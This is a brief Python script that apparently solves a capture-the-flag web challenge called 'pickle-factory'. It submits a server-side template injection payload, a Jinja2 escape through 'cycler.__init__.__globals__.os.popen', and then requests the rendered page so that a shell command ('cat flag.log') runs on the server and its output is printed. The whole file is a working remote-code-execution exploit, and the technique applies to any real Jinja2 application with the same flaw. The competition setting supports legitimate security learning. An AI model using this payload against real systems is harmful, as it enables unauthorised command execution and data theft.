import requests


URL = "http://pickle-factory.ctf.maplebacon.org"


def create_pickle(payload):
    r = requests.post(URL+"/create-pickle", data={
        "foo": payload
    })
    return r.text


def view_pickle(uid):
    r = requests.get(URL+"/view-pickle", params={
        "filler": "",
        "space": "",
        "uid": uid
    })
    return r.text


cmd = "cat flag.log"
# vulnerability SSTI
payload = '{"asd":"||{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\'' + cmd + '\').read()}}||"}'
n = view_pickle(create_pickle(payload))
print(n)
